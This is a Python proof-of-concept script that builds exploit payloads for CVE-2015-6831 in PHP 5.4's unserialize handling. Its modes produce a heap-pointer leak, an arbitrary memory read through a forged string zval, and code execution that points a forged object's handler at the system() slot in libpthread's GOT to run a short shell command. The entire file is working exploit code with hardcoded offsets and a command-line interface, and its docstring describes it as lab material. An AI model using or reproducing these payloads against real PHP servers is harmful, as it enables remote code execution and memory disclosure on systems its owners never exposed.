#!/usr/bin/env python3
"""Build the CVE-2015-6831 leak, read, and execution payloads.

The 176-byte ArrayObject/DateInterval payloads target 64-bit, little-endian,
non-ZTS PHP 5.4 builds with 24-byte zvals.  The read form forges IS_STRING;
the execution form forges IS_OBJECT and redirects handlers->del_ref through
a verified libpthread GOT slot containing libc system().

Examples:
    python3 poc/build_payload.py --mode heap-leak --out leak.bin
    python3 poc/build_payload.py --mode read --address 0x7f0000000000 \
        --length 256 --out read.bin
    python3 poc/build_payload.py --mode exec --pthread-base 0x7f0000000000 \
        --cmd '>/tmp/R' --out exec.bin
"""
from __future__ import annotations

import argparse
import hashlib
import struct
import sys
from pathlib import Path

PAYLOAD_SIZE = 176
HEAP_LEAK_PAYLOAD = (
    b'a:1:{i:0;a:3:{i:2;C:16:"SplObjectStorage":34:{'
    b'x:i:1;O:8:"stdClass":0:{};m:a:0:{}}i:0;R:4;i:1;a:0:{}}}'
)
SYSTEM_GOT_OFFSET = 0x217088
DEL_REF_OFFSET = 0x8
UINT64_MAX = (1 << 64) - 1


def _u64(name: str, value: int) -> int:
    if not 0 <= value <= UINT64_MAX:
        raise ValueError(f"{name} must fit in an unsigned 64-bit integer")
    return value


def _command_bytes(command: bytes) -> bytes:
    if not isinstance(command, bytes):
        raise TypeError("command must be bytes")
    if not 1 <= len(command) <= 7:
        raise ValueError("command must be 1..7 ASCII bytes")
    if b"\0" in command:
        raise ValueError("command must not contain NUL")
    try:
        command.decode("ascii")
    except UnicodeDecodeError as exc:
        raise ValueError("command must contain ASCII bytes only") from exc
    return command


def _wrap(fake_zval: bytes) -> bytes:
    """Embed one 24-byte fake zval in the #70155/#70166 trigger."""
    if len(fake_zval) != 24:
        raise ValueError("fake zval must be exactly 24 bytes")

    # R:5 is the DateInterval self-reference. R:4 reaches the temporary
    # ArrayObject pflags zval left in var_hash by the vulnerable implementation.
    inner = b'x:i:0;O:12:"DateInterval":1:{s:1:"y";R:5;};m:a:1:{i:0;R:4;}'
    obj = b'C:11:"ArrayObject":' + str(len(inner)).encode("ascii") + b':{' + inner + b'}'
    serialized_zval = b's:24:"' + fake_zval + b'";'
    row = (
        b'i:2;' + obj + b'i:0;R:4;'
        b'i:10;i:7;'
        b'i:11;i:7;'
        b'i:99;' + serialized_zval + b'i:1;a:0:{}'
    )
    payload = b'a:1:{i:0;a:6:{' + row + b'}}'
    if len(payload) != PAYLOAD_SIZE:
        raise AssertionError(f"internal payload size changed: {len(payload)}")
    return payload


def build_heap_leak() -> bytes:
    """Return the 101-byte SplObjectStorage pointer-leak payload."""
    if len(HEAP_LEAK_PAYLOAD) != 101:
        raise AssertionError("internal heap-leak payload size changed")
    return HEAP_LEAK_PAYLOAD


def build_read(address: int, length: int) -> bytes:
    """Return a 176-byte payload that exposes one mapped memory range."""
    address = _u64("address", address)
    if not 1 <= length <= 4096:
        raise ValueError("length must be 1..4096")
    if address + length - 1 > UINT64_MAX:
        raise ValueError("address + length overflows 64 bits")
    fake = struct.pack("<QI4xI", address, length, 0x100) + bytes((6, 0, 0, 0))
    return _wrap(fake)


def build_exec(command: bytes, pthread_base: int, got_offset: int = SYSTEM_GOT_OFFSET) -> bytes:
    """Return the native lab payload for one resolved system() GOT slot."""
    command = _command_bytes(command)
    pthread_base = _u64("pthread_base", pthread_base)
    got_offset = _u64("got_offset", got_offset)
    system_slot = pthread_base + got_offset
    if system_slot > UINT64_MAX:
        raise ValueError("pthread_base + got_offset overflows 64 bits")
    if system_slot < DEL_REF_OFFSET:
        raise ValueError("system slot is below the del_ref displacement")

    handlers = system_slot - DEL_REF_OFFSET
    fake = struct.pack(
        "<QQI",
        int.from_bytes(command.ljust(8, b"\0"), "little"),
        handlers,
        1,
    ) + bytes((5, 0, 0, 0))  # PHP 5.4 IS_OBJECT
    return _wrap(fake)


def build_invalid_handler_control(command: bytes) -> bytes:
    """Build the same trigger with handlers=NULL for the crash-only control."""
    return build_exec(command, 0, DEL_REF_OFFSET)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument(
        "--mode",
        choices=("heap-leak", "read", "exec", "invalid-handler"),
        default="exec",
    )
    parser.add_argument("--pthread-base", help="mapped libpthread base (integer, e.g. 0x7f...)")
    parser.add_argument("--got-offset", default=hex(SYSTEM_GOT_OFFSET), help="resolved system GOT slot offset")
    parser.add_argument("--cmd", help="1..7 ASCII-byte shell command")
    parser.add_argument("--address", help="mapped address for --mode read")
    parser.add_argument("--length", type=int, help="byte count for --mode read (1..4096)")
    parser.add_argument("-o", "--out", required=True, type=Path)
    args = parser.parse_args()

    try:
        if args.mode == "heap-leak":
            payload = build_heap_leak()
        elif args.mode == "read":
            if args.address is None or args.length is None:
                raise ValueError("--mode read requires --address and --length")
            payload = build_read(int(args.address, 0), args.length)
        else:
            if args.cmd is None:
                raise ValueError(f"--mode {args.mode} requires --cmd")
            command = args.cmd.encode("ascii")
            if args.mode == "invalid-handler":
                payload = build_invalid_handler_control(command)
            else:
                if args.pthread_base is None:
                    raise ValueError("--mode exec requires --pthread-base")
                payload = build_exec(command, int(args.pthread_base, 0), int(args.got_offset, 0))
    except (UnicodeEncodeError, ValueError) as exc:
        parser.error(str(exc))

    args.out.write_bytes(payload)
    print(f"{args.out}: {len(payload)} bytes  sha256={hashlib.sha256(payload).hexdigest()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
